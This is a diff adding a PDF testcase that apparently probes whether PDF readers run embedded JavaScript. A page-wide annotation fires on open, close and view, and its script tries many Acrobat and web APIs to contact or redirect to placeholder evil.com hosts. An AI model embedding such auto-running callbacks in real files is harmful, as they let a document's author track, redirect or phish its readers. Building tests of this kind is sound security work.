@@ -1,0 +1,105 @@
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Screen
+                 /Open true
+                 /P 3 0 R
+                 /AA << /E  5 0 R /X  5 0 R /D  5 0 R /U  5 0 R /Fo 5 0 R
+                        /BI 5 0 R /PO 5 0 R /PC 5 0 R /PV 5 0 R /PI 5 0 R
+                     >>
+                 /Rect [0 0 595 842]
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'js'      ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /JavaScript
+     /JS (
+/* ------------------------------------------------------------------------------------------ */
+/* -----------------------------[ Acrobat JavaScript Scripting Guide ]----------------------- */
+/* ------------------------------------------------------------------------------------------ */
+try {this.submitForm({cURL: "http://submitform.evil.com/"});}                        catch(e) {}
+try {this.getURL("http://geturl.evil.com/");}                                        catch(e) {}
+try {app.launchURL("http://launchurl.evil.com/");}                                   catch(e) {}
+try {app.media.getURLData("http://geturldata.evil.com/", "audio/mp3");}              catch(e) {}
+try {SOAP.connect("http://soap-connect.evil.com/");}                                 catch(e) {}
+try {SOAP.request({cURL:"http://soap-request.evil.com/", oRequest:{}, cAction:""});} catch(e) {}
+try {this.importDataObject("file", "http://dataobject.js.evil.com/");}               catch(e) {}
+try {app.openDoc("http://opendoc.js.evil.com/");}                                    catch(e) {}
+/* ------------------------------------------------------------------------------------------ */
+/* -----------------------------[ Vanilla ECMAScript used in the Web ]----------------------- */
+/* ------------------------------------------------------------------------------------------ */
+try {fetch("http://fetch.js.evil.com/");}                                            catch(e) {}
+try {var r=new XMLHttpRequest(); r.open("GET", "http://xhr.js.evil.com"); r.send();} catch(e) {}
+try {var img=new Image(1,1); img.src="http://img.js.evil.com/";}                     catch(e) {}
+try {new WebSocket("ws://websocket.js.evil.com/");}                                  catch(e) {}
+try {require("http://require.js.evil.com/");}                                        catch(e) {}
+try {this.location="http://this-location.js.evil.com/";}                             catch(e) {}
+try {document.location="http://document-location.js.evil.com/";}                     catch(e) {}
+try {parent.window.location.href="http://parent-window.evil.com/";}                  catch(e) {}
+try {parent.document.URL="http://parent-document.evil.com/";}                        catch(e) {}
+try {window.location ="http://window-location.evil.com/";}                           catch(e) {}
+try {window.location.href="http://window-location-href.evil.com/";}                  catch(e) {}
+try {window.location.replace("http://window-location-replace.evil.com/");}           catch(e) {}
+try {window.location.assign("http://window-location-assign.evil.com/");}             catch(e) {}
+try {window.navigate("http://window-navigate.evil.com/");}                           catch(e) {}
+app.alert("All JavaScript tests completed", 3);
+/* ------------------------------------------------------------------------------------------ */
+)
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f 
+0000000010 00000 n 
+0000000069 00000 n 
+0000000170 00000 n 
+0000000780 00000 n 
+0000000900 00000 n 
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+3834
+%%EOF
